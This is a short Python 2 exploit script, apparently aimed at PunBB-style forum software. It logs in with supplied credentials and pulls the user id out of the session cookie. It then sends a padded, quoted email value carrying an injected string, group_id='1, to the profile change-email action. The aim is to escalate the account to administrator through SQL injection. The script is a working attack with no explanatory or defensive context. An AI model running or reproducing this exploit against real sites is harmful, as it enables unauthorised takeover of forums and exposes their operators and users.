
import urllib
import getopt
import sys
import string

__argv__ = sys.argv

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:u:p:e:d:")
    except getopt.GetoptError:
        pass
        
    username = None
    password = None
    email = None
    domain = None
    host = None
    for o, arg in opts:
        if o == "-h":
	        host = arg
        if o == "-u":
            username = arg
        if o == "-p":
            password = arg
        if o == "-e":
            email = arg
        if o == "-d":
            domain = arg
	
    # Retrive cookie
    params = {
        'req_username' : username,
	'req_password' : password,
	'form_sent' : 1
    }
    
    wclient = urllib.URLopener()
    
    req = wclient.open(host + "/login.php?action=in", urllib.urlencode(params))
    info = req.info()
    cookie = info['set-cookie']
    cookie = cookie[:string.find(cookie, ';')]

    user_id = cookie[string.find(cookie, "%3A%22")+6:string.find(cookie, "%22%3B")]

    wclient.addheader('Cookie', cookie)

    email = '"' + email[:string.find(email, '@')] + '"@' + email[string.find(email, '@')+1:] + ',"\','
    append = 'group_id=\'1'
    email = email + ( ((50-len(append))-len(email)) * ' ' ) + append + '"@' + domain
    
    params = {
        'req_new_email' : email,
	'form_sent' : 1
    }

    req = wclient.open(host + "profile.php?action=change_email&id=" + user_id, urllib.urlencode(params))        


if __name__ == "__main__":
    main()
